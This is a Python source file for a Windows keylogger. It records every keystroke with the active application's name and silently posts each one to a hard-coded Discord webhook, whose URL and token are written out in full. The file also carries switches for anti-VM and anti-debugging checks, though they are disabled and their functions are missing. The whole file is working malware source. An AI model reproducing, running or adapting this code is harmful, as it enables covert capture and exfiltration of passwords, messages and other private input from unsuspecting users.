import os
import sys
import requests
import ctypes
from pynput import keyboard

# === CONFIG ===
WEBHOOK = "https://discord.com/api/webhooks/1396126875348242624/gEu1Y7MB-6PkFtWyVr0Qu-GJ1XQ1mDHr4vsjiWS84Kg90s75_j859t3Fpr_oYrdvycs8"
MAX_RETRIES = 2  # Reduced retries for faster failure
ENABLE_ANTIVM = False
ENABLE_ANTIDEBUG = False

# === STATE ===
shift_pressed = False
caps_on = False

def get_app_name():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value.split(' - ')[-1][:25]  # Get last part of title, trim to 25 chars
    except:
        return "Unknown"

def send_clean(key, app):
    data = {
        "embeds": [{
            "title": "Key Press",
            "description": f"```{key}```",
            "color": 5814783,  # Nice purple color
            "fields": [{
                "name": "App",
                "value": f"```{app}```",
                "inline": True
            }],
            "footer": {
                "text": " "  # Empty footer for spacing
            }
        }]
    }
    
    try:
        requests.post(WEBHOOK, json=data, timeout=3)
    except:
        pass  # Silent fail

def on_press(key):
    global shift_pressed, caps_on
    
    # Handle modifiers
    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = True
        return
    elif key == keyboard.Key.caps_lock:
        caps_on = not caps_on
        return
    
    # Get clean app name
    app = get_app_name()
    
    # Process key
    try:
        char = key.char
        if char:
            if (shift_pressed or caps_on) and char.isalpha():
                char = char.upper()
            send_clean(char, app)
    except:
        if key == keyboard.Key.space:
            send_clean('␣', app)  # Space symbol
        elif key == keyboard.Key.enter:
            send_clean('↵', app)    # Enter symbol
        elif key == keyboard.Key.tab:
            send_clean('⇥', app)    # Tab symbol
        elif key == keyboard.Key.backspace:
            send_clean('⌫', app)   # Backspace symbol
        else:
            send_clean(f"{key}", app)

def on_release(key):
    global shift_pressed
    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = False

if __name__ == "__main__":
    if ENABLE_ANTIVM and detect_vm():
        sys.exit(0)
    if ENABLE_ANTIDEBUG and detect_debugger():
        sys.exit(0)

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
